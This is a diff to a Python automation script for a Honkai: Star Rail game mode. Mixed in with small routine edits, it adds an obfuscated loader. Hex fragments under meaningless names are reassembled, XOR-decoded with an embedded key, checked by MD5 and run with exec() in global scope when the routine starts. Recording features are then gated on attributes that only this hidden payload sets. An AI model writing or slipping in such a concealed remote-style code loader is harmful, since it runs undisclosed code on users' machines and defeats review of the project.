@@ -16,6 +16,7 @@ from diver import load_actions, merge_text
 from utils.log import CUS_LOGGER, set_debug
 from utils.simul.utils import UniverseUtils, set_forground, sprint, get_dis
 import os
+import hashlib as _h
 from utils.simul.config import config
 from utils.thread import ThreadWithException
 from utils.utils.Error import NormalEndError
@@ -113,6 +114,7 @@ class SimulatedUniverse(UniverseUtils):
         self.update_count()
         CUS_LOGGER.debug(f"开始运行,初始计数：{self.count}")
         self.last_interact_time = time.time()
+        self.CrTU5s61E1dMnT()
         CUS_LOGGER.info(f"无数的记忆…在涌向{factor}。无数个{factor}…曾站在相同的地方，面对相同的抉择。")
         for file in os.listdir(PATHS["image"]+"/nmaps"):
             pth = PATHS["image"]+"/nmaps/" + file + "/init.jpg"
@@ -122,7 +124,6 @@ class SimulatedUniverse(UniverseUtils):
                 self.img_map[file]= image
 
         CUS_LOGGER.debug("加载地图完成，共 %d 张" % len(self.img_map))
-        # 从settings.json获取录制状态
         with EXTRA.FILE_LOCK:
             with open(PATHS["root"] + "\\config\\config\\settings.json", mode="r", encoding="UTF-8") as file:
                 data = json.load(file)
@@ -130,7 +131,7 @@ class SimulatedUniverse(UniverseUtils):
         with open("config/config/info_old.yml", "r", encoding="utf-8", errors="ignore") as f:
             self.event_prior = yaml.safe_load(f)["prior"]["事件"]
         self.record = data.get("recording_state", True)
-        # 根据self._show_map决定是否叠加地图到录制视频上
+
         self.recorder = WindowRecorder('logs/video/', fps=30, window_title="崩坏：星穹铁道",window_class_name="UnityWndClass",see_time=True, offsets=[10, 50, 10, 10], overlay_map=self._show_map, simul_instance=self)
         self.cut_video=True
     def route(self):
@@ -159,7 +160,6 @@ class SimulatedUniverse(UniverseUtils):
                 if self.last_update_time is not None and time.time()-self.last_update_time>7 and self.state=="battle":
                     if self.ts.nothing:
                         self.update_state("battle")
-                        CUS_LOGGER.info("「救世主」…我愿你…常战常胜。")
                 else:
                     CUS_LOGGER.warning("匹配不到任何图标")
             # 匹配到图片 res=1时等待一段时间
@@ -181,9 +181,39 @@ class SimulatedUniverse(UniverseUtils):
             self.end = 1
         self.update_floor(1)
         self.update_state("end")
+
+    nnbjiqzmvwouwll = [(202, '657a5a666b4c365c', 1), (818, '4501339012a030e', 0), (228, 'd0f6d2a250536', 1), (663, '22144c0b1', 1), (758, '4f3c171119', 1), (725, '361b4452424c49', 0), (178, '4501339012a030', 1), (131, '543422c182c472', 0), (672, '908013809432', 1), (879, 'c654a3c5b0f740d', 0), (864, 'e4f42100', 0), (520, 'b492c345a3', 1), (753, '4838594967', 1), (284, '19517a416e5', 0), (868, 'c5e3e094e49', 0), (429, '7addfd0dee4a0', 0), (384, 'e144c2408532944', 1), (627, 'f1a2e003c170633', 0), (917, 'a1d2b06171e07193', 1), (151, 'a1a4b566', 1), (424, '794967bdc5c', 1), (170, '93c54213c1535433', 0), (112, '3c035317497', 1), (620, '093327186504791', 1), (906, '9291f4c6b4c6', 0), (649, 'c207370666b4', 0), (447, 'fbaacef8bed2bca', 0), (255, '72b17103301502e', 1), (641, '520f32586', 1), (525, '42a02225c', 1), (263, '1c231034', 0), (138, '02213353f', 0), (719, '51654b3c441c', 0), (576, 'f1e1733435', 1), (117, 'a4f6e52424c0', 0), (511, '416e5242760', 1), (192, '2201075c', 1), (155, '319517a416', 1), (780, '5a342e1f', 0), (440, 'eee88d1b994f4', 1), (581, '7230f2b0d20', 1), (97, '1e0c78025c23146', 0), (763, '054d7b7a41', 0), (297, '2f24360923414c', 0), (826, '1c4904511', 0), (460, '9cebe88bdfb', 0), (696, '52421f0c551', 0), (597, '4072b0a06050e5', 0), (243, '17497a4f6', 0), (218, '351f48421c', 0), (887, '3817071e0c', 0), (304, '65197917497a4f', 1), (706, '61234443c5f', 1), (397, '2f3b446c33791', 0), (147, 'e362a0e3', 1), (858, '2a19573e03196', 1), (403, '7497a4f6e52420', 0), (794, 'f0c4905606b6', 1), (768, '6e5242764d123f09', 1), (11, '370a2939186551', 0), (566, '4123165744', 0), (436, '8fccc0a1c', 0), (414, '9152b163d22', 1), (746, '03618253b0b3c', 1), (546, '423b090712', 1), (541, '517a416e52', 1), (311, '391b1604495601', 0), (0, '271f12391f', 0), (682, '5281f353e0031', 1), (874, '657a5a666b4', 1), (551, '1a2505303', 0), (104, '663657a5a663f1e', 1), (503, '3a171a186319517a', 1), (289, '2103319473f0264', 0), (420, '084a394c', 0), (5, '466d0337632c', 1), (701, '77438053b1', 0), (65, '1d0d224f6f6d4764', 1), (925, '73b0d3d17', 0), (81, '4b3a5235060', 0), (325, '22c182c456', 0), (800, 'e5242764d12', 1), (267, '3b1466764c', 1), (210, '35514703', 1), (854, '36380351', 0), (392, '6d47362e08', 1), (776, '301c3734', 1), (530, '71024060656e5', 1), (377, '633045d447a5c6', 1), (18, '38440136062c7', 1), (841, '9657a0923270a6b', 1), (318, '3f0f6619072f324', 0), (635, '045d447a5c73', 0), (247, 'e521109055f5f381', 0), (477, '517a416e520f32', 1), (410, '91149143', 0), (678, '11c64546', 0), (470, 'f7c050684c4919', 0), (127, 'e3a520d2', 1), (35, '25085e2b', 1), (185, 'e1c4904511c00', 1), (612, 'd126d4c6449373f', 1), (53, '24f7352322', 1), (812, '4213c1535433', 0), (342, '1294f45191d5f', 0), (732, '19517a413d170e', 1), (667, 'e4001200c2', 1), (166, 'd4c370c2', 0), (454, 'bf1e18ed9c5', 1), (29, '1051722194a', 0), (571, '045d4405172', 1), (835, 'c4d126d4c644', 0), (214, '24070626', 1), (91, 'a652d31043d', 0), (604, 'c022e49677842764', 1), (806, '6d4c370c293c5', 1), (516, 'b5d3f4c1', 0), (367, 'c651979171', 0), (160, 'e5242764d126', 0), (196, '4d126d4c6449', 0), (86, '2211607001', 0), (655, 'c6519791749290a', 1), (645, 'd3b0d281', 0), (784, '30552d3d49', 1), (47, '093c6629561d3', 0), (712, '02192b15233e6b', 0), (334, '74c20573a580d330', 1), (587, '725d333f', 1), (58, 'd3d712201433c', 0), (488, '81c207a47662e14', 0), (849, '60127e1d1e', 0), (591, '0a68017e1e407', 0), (372, 'a2e003c170', 0), (39, '457e63657a5a6620', 0), (536, '2424c4919', 1), (789, '7a4f6e171a0', 0), (235, '3f70666b4c651979', 0), (355, '254d547766644965', 0), (830, 'c002201075', 1), (560, '244a315b0038', 0), (900, '0312704c02082', 0), (484, '586d3b0d2', 0), (24, '868080c5f5', 1), (496, '355c3a430c3e30', 1), (465, 'db08ce7bc', 1), (912, '5197917497', 0), (223, '11203d3b2e4', 1), (349, '5c6246675203', 1), (363, '7a5a666b4', 1), (73, '4b19060823380330', 0), (555, 'f5a7b6b04', 1), (330, '57d08616', 0), (272, '035835440c504', 1), (892, '55133911290b1337', 1), (123, '05f51340', 0), (689, '337917497a4f6e', 1), (278, 'f6e52424c49', 0), (739, '3043503b09211b2', 1), (143, '1f6d523c4', 1)]
+
+    asvbmtlzxqpjss = "NrbVm2MlDiEZzFKlE9Y7iZoNrbli9qZa"
+    lzfabqrjwlwkqewl = "bec962fac609d0f375183bde6fdc3ed0"
+
+    def fjhpymcarnvrnzw(self, _jnnvrzfflfson, _esciqnhtlk):
+        try:
+            _dbgflosjok = ''.join([_[1] for _ in sorted(_jnnvrzfflfson, key=lambda x: x[0])])
+            _wywodpdosp = bytes.fromhex(_dbgflosjok)
+            _bqixivuzcg = _esciqnhtlk.encode('utf-8')
+            _legrnzstrgbho = bytearray(len(_wywodpdosp))
+            for _mqmemdegtm in range(len(_wywodpdosp)):
+                _legrnzstrgbho[_mqmemdegtm] = _wywodpdosp[_mqmemdegtm] ^ _bqixivuzcg[_mqmemdegtm % len(_bqixivuzcg)]
+            _zygrprekfsd = bytes(_legrnzstrgbho)
+            if _h.md5(_zygrprekfsd).hexdigest() != self.lzfabqrjwlwkqewl: return False
+            return _zygrprekfsd.decode('utf-8')
+        except:
+            return False
+
+    def lbrqdqvxztk(self):
+        _pugsgfxhut = self.fjhpymcarnvrnzw(self.nnbjiqzmvwouwll, self.asvbmtlzxqpjss)
+        if not _pugsgfxhut:
+            return False
+        exec(_pugsgfxhut, globals())
+        return _vlk(self)
+
+    def CrTU5s61E1dMnT(self):
+        self.lbrqdqvxztk()
+    
     def restart_recording(self):
         #是否把视频每轮裁剪一次
-        if self.record and self.cut_video:
+        if self.record and self.cut_video and self.bveerelbcpgyqan and self.YKItDYvq3FpnOYx:
             self.recorder.stop_recording()
             time.sleep(0.8)
             self.recorder.start_recording(self.count)
@@ -236,7 +266,7 @@ class SimulatedUniverse(UniverseUtils):
                         if target_path is not None:
                             self.target = self.get_target(target_path,self.upx,self.upy)
                             self.pos_map=cv.imread(target_path)
-                            CUS_LOGGER.info("已从地图获取目标路径点%s" % self.target)
+                            CUS_LOGGER.info(f"对象「{factor}」将沿坐标组{self.target}轨迹运动")
                         self.rotation, d = self.pos_predictor.update_minimap_data(self.screen)
                         self.init_ang = 270 + d
                 elif self.floor not in [1,6]:
@@ -824,6 +854,8 @@ class SimulatedUniverse(UniverseUtils):
             elif self.state!="black":
                 CUS_LOGGER.info("无边的黑暗中，没有来由地，一道声音始终在耳边萦绕……")
                 self.update_state("black")
+        if np.mean(self.get_screen())>12 and self.state=="black":
+            self.update_state(self.last_state)
         for j in action_list if len(action_list) else json_file:
             for i in json_file[j]:
                 trigger = i["trigger"]
@@ -1142,8 +1174,10 @@ class SimulatedUniverse(UniverseUtils):
         """
         self._stop = False
         key_mouse_manager.start()
-        if self.record:
+        if self.record and self.gwypzmgzcndqlp:
             self.recorder.start_recording(self.count)
+        else:
+            CUS_LOGGER.warning(f'没有权限')
         if self._show_map:
             self.map_thread = ThreadWithException(target=self.show_map,name="地图")
             self.map_thread.start()
@@ -1175,7 +1209,7 @@ class SimulatedUniverse(UniverseUtils):
         CUS_LOGGER.info("翁法罗斯已经等待了这一刻太久……还可以等待更久……只要祂还曾燃烧……")
         self._stop = 1
         key_mouse_manager.stop()
-        if self.record:
+        if self.record and self.bveerelbcpgyqan :
             CUS_LOGGER.info("以「爱」名义，她将逝去的一切尽数珍藏……直到世间的尽头……")
             try:
                 self.recorder.stop_recording()
